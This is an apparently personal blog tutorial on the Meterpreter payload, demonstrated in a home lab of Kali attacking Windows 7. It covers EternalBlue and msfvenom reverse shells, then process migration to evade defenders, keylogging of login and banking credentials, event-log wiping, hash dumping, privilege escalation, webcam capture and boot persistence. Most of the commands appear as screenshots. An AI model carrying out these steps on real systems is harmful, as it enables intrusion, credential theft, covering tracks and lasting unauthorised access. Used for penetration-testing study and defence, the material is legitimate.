---
title: "Meterpreter"
date: 2020-06-08T08:06:25+06:00
description: Sample post with multiple images, embedded video etc.
menu:
  sidebar:
    name: Meterpreter
    identifier: meterpreter
    parent: tools
    weight: 10
hero: images/Meterpreter.jpg
categories:
- Basic
---

#### What is Meterpreter?

Meterpreter is an extremely powerful payload which provides an attacker an advanced shell to interact with their target. It can run normal system commands, launch programs, keylog, screenshare, upload files, and many more powerful functions.

##### How to get a Meterpreter shell on a system?

Many backdoors like Mosquito and Shamoon-2 are preconfigured with Meterpreter as a payload. It was originally created as a Metasploit Payload, so if you can find a system with an exploitable vulnerability just set the payload to a Meterpreter shell. Or, if you already have access to a system, you can generate a payload file using msfvenom to upload and run creating the shell. To demonstrate ways to get a Meterpreter shell and the commands it offers, I have configured the following test environment.

![layout](/images/layout.png)

#### Using Meterpreter as a Metasploit payload:

In my example environment, I have an attacker box (Kali VM), and a victim box (Windows 7 VM). A fresh install of Windows 7 is by default vulnerable to ms17\_010, or EternalBlue. EternalBlue is what I will be using to break in to my target box, but the same is true for whatever vulnerability you plan to exploit as long as it gives you the ability to drop a payload onto the system. Once you have found whatever exploit you want to use against your target system, use the `set payload` command to choose the meterpreter backdoor that best fits your needs. In my case, I will be using Windows x64 reverse TCP to create a reverse shell back to my host system. Because it is a reverse shell, I need to specify which IP address for the connection to call back to. Using the `set rhost` command, I entered in the IP address of the attacker device (Kali VM).

![layout](/images/Meterpreter1.PNG)

Once you have all the Metasploit options configured, run `exploit` and if your exploit works correctly you should receive a Meterpreter shell on the last line as you can see below. Later, I will explain some of the powerful features Meterpreter has to offer.

![layout](/images/Meterpreter2.PNG)

#### Using msfvenom to generate a meterpreter file for the target system:

If you already have system access to the victim and want to spawn a Meterpreter shell, an easy way to do that is generate a Meterpreter file using Msfvenom. Msfvenom allows users to output Metasploit payloads into files for different operating systems. In this case, we will be choosing windows/meterpreter/reverse\_tcp as the payload, my Kali VM’s IP address as the IP to make a connection to, port 3389, and the file type exe which is all then dropped into shell.exe.

![layout](/images/Msfvenom1.PNG)

Once you drop this file onto the target host and run it, open up a listener on your attacker device. To do this, use the metasploit listener with the command `use multi/handler` then configure the options specific to your environment. As you can see on the last line, we have a meterpreter shell once again.

![layout](/images/Msfvenom2.PNG)

#### I have a Meterpreter shell… now what?

As an attacker, Meterpreter offers some extremely valuable tools. Many of the basic commands are just aliases of common linux/windows commands. So for example, view contents of your current directory, you can use EITHER ls or dir, changed directories with cd, viewing your current directory with pwd, all very familiar commands.

![layout](/images/nowwhat1.png)

If you want the environment to become even more familiar, simply execute the `shell` command and you will drop into the system shell.

![layout](/images/nowwhat2.PNG)

Now its time for some more exciting commands.

#### Sessions

If you are controlling multiple systems, or just have multiple connections to one host, you can put your current connection to the background and interact with another session. In your current session, type `bg` or `background` and you will return to the multi/handler tool. Typing `session` will show all current connections to your system currently available and each will have a number. To pickup and interact with a session, type `session -i (session #)`. Here is an example with many connections from the target system:

![layout](/images/sessions1.PNG)

Here is an example of a time I had many connections from many targets I was attacking:

![layout](/images/sessions2.png)

#### Migrate Processes:

One of my favorite Meterpreter features is the ability to migrate the process to any other processes running on the system. This is useful because if someone is actively trying to defend/kill your Meterpreter process, you can move to a process like services.exe which is both not a suspicious process, but also critical to the system functioning normally.

For example, without further obfuscation a default Meterpreter payload running on the system looks like this in Task Manager:

![layout](/images/migrate1.PNG)

By stopping that service, our connection would be closed. To avoid this, you can migrate to another service. In this example, I will migrate to `explorer.exe` which is the process Windows uses for the Users GUI.

To do this, use `ps -a` to view all processes running on that system. Take note of the authority the process has as we want to maintain running in a process with system authority.

![layout](/images/migrate2.PNG)

Select an appropriate process for your needs, and migrate to that process using `migrate (PID number of your process)`.

![layout](/images/migrate3.PNG)

Now, the Meterpreter shell is using a normal system process which cannot easily be seen. Here, we are running as explorer.exe:

![layout](/images/migrate4.PNG)

#### Screenshare:

Self explanatory, but Meterpreter allows for screensharing using a Web GUI. This can easily be activated using the `screenshare` command.

![layout](/images/screenshare1.PNG)

On the left is the Kali VM viewing the Windows 7 system (right) through a web browser:

![layout](/images/screenshare2.PNG)

#### Keylogging:

To keylog a system, you first need to migrate to the process which is receiving the users keystrokes. This is usually one of two processes.

*   explorer.exe - user interface with desktop and other applications, used to keylog most user interaction
    
*   winlogon.exe - windows logon screen, used to capture logon credentials
    

Migrate to the process you want to keylog, then run `keyscan start` to begin logging user input. Once you want to collect the logged items, type `keyscan dump` and all the users keystrokes will be dumped to your screen. In this example, I will keylog the system while a user enters their banking credentials onto a web browser.

![layout](/images/keylog1.PNG)

![layout](/images/keylog2.PNG)

After running keyscan\_start, waiting for the user to enter credentials, then keyscan\_dump, drops the credentials clearly in plaintext. If you prefer to save the keystrokes to a file automatically every 30 seconds in case the session gets interrupted or you may need to store/search the keystrokes, use \`post/

![layout](/images/keylog3.PNG)

#### Clear Event Viewer

As a system administrator, logs are critical to identifying system compromise and anomalies. An attacker can easily wipe the Windows Event Viewer logs with a simple command.

Logs before wiping:

![layout](/images/ev1.PNG)

Wiping the logs:

![layout](/images/ev2.PNG)

Logs wiped on system:

![layout](/images/ev3.PNG)

#### Transfer Files

Using the `upload` command, you can upload a file from your attacker to the victim host. Using the `download` command you can download a file from the victim host to your attacker device.

Syntax:

`download c:\\path\to\file.exe`

`upload /path/on/attacker c:\\path\on\victim`

![layout](/images/uploaddownload.PNG)

#### Dump Account Hashes

To crack other user accounts, the hashes of other user accounts can easily be viewed using the `hashdump` command.

![layout](/images/hashdump.PNG)

#### Get System Privileges

If you migrate to a process that does not have system privileges, you can attempt to escalate back to that authority using `getsystem`.

![layout](/images/getsystem.PNG)

#### Webcam Control

Perhaps one of the most invasive and scary features of Meterpreter is the ability to detect webcams on the target, and then capture pictures using the webcam. Unfortunately, the VM I am demonstrating on does not have any webcam configured; however, the commands are fairly self explanatory.

![layout](/images/webcam.PNG)

#### Plant Persistence

To ensure future access to the system, you can plant persistence on your current Meterpreter session. To do this, first background the session and take note of the session number. Then `use exploit/widows/local/persistence` and set the parameters to your session number, in this example 3, and the local port for the persistence to call back to. After running `exploit` persistence will be planted so that on system boot, a reverse shell will be initiated from the compromised system.

![layout](/images/persist1.PNG)

To pick up on this reverse shell, once again use multi/handler, with meterpreter as the payload, and the proper listening port. Once listening by running exploit, once the Windows system reboots a new session will be created between the attacker and the victim.

![layout](/images/persist2.PNG)

#### Other resources

Meterpreter is extremely powerful and there are many more commands than those I highlighted in this post. Here are some additional resources for ways to weaponize Meterpreter:

[Meterpreter Cheat Sheet](https://www.blueliv.com/downloads/Meterpreter_cheat_sheet_v0.1.pdf)

[Offensive Security Writeup](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)

[Persistence Methods](https://www.hackingarticles.in/courses-we-offer/web-penetration-testing-bug-bounty/)
